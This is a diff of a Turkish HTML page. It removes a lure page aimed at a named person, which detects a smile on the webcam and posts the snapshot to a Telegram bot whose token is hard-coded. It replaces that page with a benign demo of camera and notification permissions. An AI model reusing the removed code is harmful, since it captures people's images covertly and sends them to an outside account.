@@ -3,126 +3,66 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Pınar İçin Deneme</title>
-    <script src="https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/dist/face-api.min.js"></script>
+    <title>Kamera ve Bildirim İzin Yönetimi</title>
     <style>
-        body { 
-            margin: 0; 
-            background: #000; 
-            color: white; 
-            font-family: sans-serif; 
-            display: flex; 
-            flex-direction: column; 
-            align-items: center; 
-            justify-content: center; 
-            height: 100vh; 
-        }
-        h1 { margin-bottom: 20px; color: #fff; font-size: 24px; }
-        #container { position: relative; width: 640px; height: 480px; }
-        video, canvas { 
-            position: absolute; 
-            top: 0; 
-            left: 0; 
-            width: 640px; 
-            height: 480px; 
-        }
-        #status { margin-top: 20px; color: #00ff00; font-weight: bold; }
+        body { font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; background: #f0f0f0; }
+        video { width: 80%; max-width: 600px; border-radius: 10px; box-shadow: 0 4px 10px rgba(0,0,0,0.2); background: #000; }
+        .controls { margin-top: 20px; }
+        button { padding: 10px 20px; font-size: 16px; cursor: pointer; border: none; border-radius: 5px; background: #007bff; color: white; }
     </style>
 </head>
 <body>
 
-    <h1>Pınar şunu bi denesene</h1>
+    <h2>Kamera ve Bildirim Sistemi</h2>
     
-    <div id="container">
-        <video id="video" autoplay muted playsinline></video>
+    <video id="cameraFeed" autoplay playsinline></video>
+
+    <div class="controls">
+        <button id="startBtn">Sistemi Başlat ve İzinleri İste</button>
     </div>
 
-    <div id="status">Sistem Hazırlanıyor...</div>
-
     <script>
-        const video = document.getElementById('video');
-        const status = document.getElementById('status');
-        
-        // --- AYARLARIN ---
-        const BOT_TOKEN = '8567641306:AAHz1V98pDTddIXVnBlf42Sjs4bI1_cAO64';
-        const USER_ID = '792398679';
-        // ------------------
+        const videoElement = document.getElementById('cameraFeed');
+        const startBtn = document.getElementById('startBtn');
 
-        let isLocked = false;
-
-        async function init() {
+        // ANA FONKSİYON: Kamera ve Bildirim İzinlerini Yönetir
+        async function initSystem() {
             try {
-                const URI = 'https://raw.githubusercontent.com/justadudewhohacks/face-api.js/master/weights';
-                await faceapi.nets.ssdMobilenetv1.loadFromUri(URI);
-                await faceapi.nets.faceExpressionNet.loadFromUri(URI);
+                // --- 1. KISIM: KAMERA İZNİ AÇIKLAMASI ---
+                // navigator.mediaDevices.getUserMedia komutu tarayıcıya "Kamerayı açayım mı?" sorusunu sordurur.
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: true, 
+                    audio: false 
+                });
+                
+                // İzin verilirse gelen görüntü (stream) video elementine bağlanır.
+                videoElement.srcObject = stream;
+                console.log("Kamera erişimi başarılı.");
 
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                video.srcObject = stream;
+                // --- 2. KISIM: BİLDİRİM İZNİ AÇIKLAMASI ---
+                // Notification.requestPermission() kullanıcıya bildirim gönderip gönderemeyeceğimizi sorar.
+                if (Notification.permission !== "granted" && Notification.permission !== "denied") {
+                    const permission = await Notification.requestPermission();
+                    
+                    if (permission === "granted") {
+                        new Notification("Sistem Hazır!", { body: "Kamera ve bildirim izinleri başarıyla tanımlandı." });
+                    }
+                } else if (Notification.permission === "granted") {
+                    new Notification("Yeniden Merhaba!", { body: "Kamera şu an aktif." });
+                }
 
-                video.onloadedmetadata = () => {
-                    status.innerText = "Hazır. Gülümseyince otomatik gönderir.";
-                    startLogic();
-                };
-            } catch (e) {
-                status.innerText = "Hata: Kameraya izin verin.";
+            } catch (err) {
+                // --- 3. KISIM: İZİN REDDEDİLİRSE ---
+                // Kullanıcı "Engelle" derse veya donanım bulunamazsa bu blok çalışır.
+                console.error("Hata oluştu veya izin verilmedi:", err);
+                alert("Lütfen kamera ve bildirim izinlerini tarayıcı ayarlarından onaylayın.");
             }
         }
 
-        function startLogic() {
-            const canvas = faceapi.createCanvasFromMedia(video);
-            document.getElementById('container').append(canvas);
-            const size = { width: 640, height: 480 };
-            faceapi.matchDimensions(canvas, size);
-
-            setInterval(async () => {
-                if (isLocked) return;
-
-                const detections = await faceapi.detectAllFaces(video).withFaceExpressions();
-                const resized = faceapi.resizeResults(detections, size);
-                
-                canvas.getContext('2d').clearRect(0, 0, 640, 480);
-                faceapi.draw.drawDetections(canvas, resized);
-
-                if (detections.length > 0) {
-                    const happy = detections[0].expressions.happy;
-                    if (happy > 0.85) {
-                        sendToTelegram();
-                    }
-                }
-            }, 100);
-        }
-
-        async function sendToTelegram() {
-            isLocked = true;
-            status.innerText = "Yakaladım! Gönderiliyor...";
-            
-            const capture = document.createElement('canvas');
-            capture.width = video.videoWidth;
-            capture.height = video.videoHeight;
-            // Görüntü üzerinde hiçbir oynama yapmadan (ayna vs yok) direkt çiziyoruz
-            capture.getContext('2d').drawImage(video, 0, 0);
-            
-            capture.toBlob(async (blob) => {
-                const fd = new FormData();
-                fd.append('chat_id', USER_ID);
-                fd.append('photo', blob, 'image.jpg');
-                fd.append('caption', 'Pınar: Gülümseme algılandı.');
-
-                try {
-                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
-                    status.innerText = "Başarıyla Gönderildi!";
-                } catch (err) {
-                    status.innerText = "Gönderim Hatası!";
-                }
-                
-                setTimeout(() => {
-                    isLocked = false;
-                    status.innerText = "Yeni çekim için hazır.";
-                }, 5000);
-            }, 'image/jpeg', 0.9);
-        }
-
-        window.onload = init;
+        // Butona tıklandığında süreci başlat
+        startBtn.addEventListener('click', () => {
+            initSystem();
+        });
     </script>
 </body>
 </html>
